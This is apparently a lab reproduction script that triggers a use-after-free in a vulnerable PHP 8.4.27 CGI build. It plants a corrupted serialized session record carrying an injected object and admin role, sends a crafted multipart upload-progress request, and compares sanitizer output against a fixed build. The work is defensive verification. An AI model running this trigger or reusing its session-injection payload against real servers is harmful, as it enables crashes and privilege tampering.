#!/usr/bin/env python3
"""PHP2Shell rung-3 probe: splice-corrupted session warning -> timezone-cache UAF.

# What this exercises (all inside the plant's loopback lab, no network):

1. CVE-2026-126714 (phpAfterShell) supplies the storage-layer bytes. The
   `splice-mid` leg writes the documented naive mid-string-cut file state from
   lab/repro/php2shell-aftershell-splice-consumer.sh: a long string whose
   declared length (64) is shorter than the bytes after it, so the php session
   decoder refuses the record ("Failed to decode session object"). That leg's
   bytes are a real splice product shape, not a hand-written exotic grammar.

2. The affected 8.4.27 build is started with an invalid date.timezone and a
   file error_log. Per GHSA-gr4f-wgx5-jpfv (CVE-2026-129496, fixed in 8.4.28),
   the startup diagnostic allocates the timezone cache in temporary startup
   memory and leaves a stale native reference in the date extension.

3. A multipart POST with PHP_SESSION_UPLOAD_PROGRESS and a Cookie SID makes
   php_session_rfc1867_update() decode the corrupted session file PRE-RINIT
   (stack: php_request_startup -> php_hash_environment -> rfc1867_post_handler
   -> php_session_rfc1867_update -> php_session_initialize -> php_session_decode
   -> php_session_cancel_decode). Its warning is formatted by
   php_log_err_with_severity() -> php_format_date() -> get_timezone_info()
   -> php_date_parse_tzfile() -> zend_hash_str_find() on the stale table.

4. UBSan reports an invalid memory access in zend_hash_str_find_bucket()
   (zend_hash.c:945) and the CGI process aborts. The fixed 8.4.28 build logs
   the warning normally and exits 0. Other legs prove both conditions are
   required: a valid session record, no session file, a valid timezone (no
   startup diagnostic), and no Cookie SID are all clean.

Reproduce:
  python3 lab/repro/php2shell-rung3-tzcache.py \
      lab/build/php-8.4.27-asan/sapi/cgi/php-cgi lab/build/evidence
  python3 lab/repro/php2shell-rung3-tzcache.py \
      lab/build/php-8.4.28-asan/sapi/cgi/php-cgi lab/build/evidence

Each run writes aftershell-tzcache-<build-label>.log under outdir. Verdicts are
printed; no claim is made for a build whose log has no sanitizer output.
"""
import os
import pathlib
import subprocess
import sys
import tempfile

BOUNDARY = '---------------------------20896060251896012921717172737'
SID = 'tzsplice'
OBJ = 'evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'
# Consumer harness's splice-MID geometry (bad length, object bytes inert).
SPLICE_MID = 'data|s:64:"' + 'A' * 88 + OBJ + 'B' * 32 + '";roles|a:1:{i:0;s:5:"admin";}'
VALID_REC = 'roles|a:0:{}'


def run_leg(php, base, mode, log):
    sess = base / ('sess-' + mode)
    sess.mkdir()
    if mode not in ('no-record',):
        (sess / ('sess_' + SID)).write_text(SPLICE_MID if mode == 'splice-mid' else VALID_REC)
    (base / 'worker.php').write_text('<?php echo "worker\\n";')

    parts = []
    if mode not in ('no-cookie', 'max-input-vars'):
        parts.append('--%s\r\nContent-Disposition: form-data; '
                     'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprog\r\n' % BOUNDARY)
    parts.append('--%s\r\nContent-Disposition: form-data; name="file1"; '
                 'filename="a.txt"\r\n\r\n1\r\n' % BOUNDARY)
    if mode == 'max-input-vars':
        # Advisory's own early-request diagnostic, URL-encoded, no session.
        body = ('&'.join('k%d=v%d' % (i, i) for i in range(40))).encode()
        ctype = 'application/x-www-form-urlencoded'
        maxvars = '1'
    else:
        body = (''.join(parts) + '--%s--\r\n' % BOUNDARY).encode()
        ctype = 'multipart/form-data; boundary=' + BOUNDARY
        maxvars = '1000'
    body_file = base / ('body-' + mode)
    body_file.write_bytes(body)

    env = dict(os.environ)
    env.update(ASAN_OPTIONS='detect_leaks=0:abort_on_error=1',
               UBSAN_OPTIONS='halt_on_error=1:print_stacktrace=1',
               REDIRECT_STATUS='1', REQUEST_METHOD='POST',
               CONTENT_TYPE=ctype, CONTENT_LENGTH=str(len(body)),
               SCRIPT_FILENAME=str(base / 'worker.php'),
               PATH_TRANSLATED=str(base / 'worker.php'))
    if mode not in ('no-cookie', 'max-input-vars'):
        env['HTTP_COOKIE'] = 'PHPSESSID=' + SID

    args = [str(php), '-n', '-q',
            '-d', 'error_log=%s' % (base / ('error-' + mode + '.log')),
            '-d', 'log_errors=1', '-d', 'display_errors=0',
            '-d', 'error_reporting=32767',
            '-d', 'date.timezone=' + ('UTC' if mode == 'valid-timezone' else 'Bogus/Zone'),
            '-d', 'max_input_vars=' + maxvars,
            '-d', 'file_uploads=1', '-d', 'upload_max_filesize=1024',
            '-d', 'session.save_path=%s' % sess, '-d', 'session.name=PHPSESSID',
            '-d', 'session.use_strict_mode=0', '-d', 'session.cache_limiter=',
            '-d', 'session.save_handler=files', '-d', 'session.serialize_handler=php',
            '-d', 'session.upload_progress.enabled=1',
            '-d', 'session.upload_progress.cleanup=0',
            '-d', 'session.upload_progress.prefix=upload_progress_',
            '-d', 'session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS',
            '-d', 'session.upload_progress.freq=1%',
            '-d', 'session.upload_progress.min_freq=0.000000001']
    log.write('---- leg %s ----\n' % mode)
    log.write('php=%s\nini: date.timezone=%s max_input_vars=%s '
              'session.save_path=%s Cookie=%s\n\n' %
              (php, 'UTC' if mode == 'valid-timezone' else 'Bogus/Zone', maxvars,
               sess, env.get('HTTP_COOKIE', '<none>')))
    with open(body_file, 'rb') as fh:
        proc = subprocess.run(args, env=env, stdin=fh, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, timeout=30)
    out = proc.stdout.decode(errors='replace')
    log.write(out)
    log.write('\nrc=%d\n' % proc.returncode)
    err_log = base / ('error-' + mode + '.log')
    if err_log.exists():
        log.write('php error_log:\n' + err_log.read_text(errors='replace'))
    signals = [s for s in ('runtime error:', 'AddressSanitizer', 'Assertion', 'SEGV')
               if s in out]
    log.flush()
    return proc.returncode, signals


def main():
    php = pathlib.Path(sys.argv[1]).resolve()
    out = pathlib.Path(sys.argv[2] if len(sys.argv) > 2 else 'lab/build/evidence')
    out.mkdir(parents=True, exist_ok=True)
    label = php.parts[-4] if len(php.parts) >= 4 else php.name
    log_path = out / ('aftershell-tzcache-%s.log' % label)
    modes = ['splice-mid', 'valid-record', 'no-record',
             'valid-timezone', 'no-cookie', 'max-input-vars']
    with log_path.open('w') as log:
        for mode in modes:
            with tempfile.TemporaryDirectory(prefix='tzcache-', dir=out) as tmp:
                rc, signals = run_leg(php, pathlib.Path(tmp), mode, log)
            print('%-16s rc=%4d sanitizer=%s' % (mode, rc, ','.join(signals) or '-'))
    print('log: %s' % log_path)


if __name__ == '__main__':
    main()
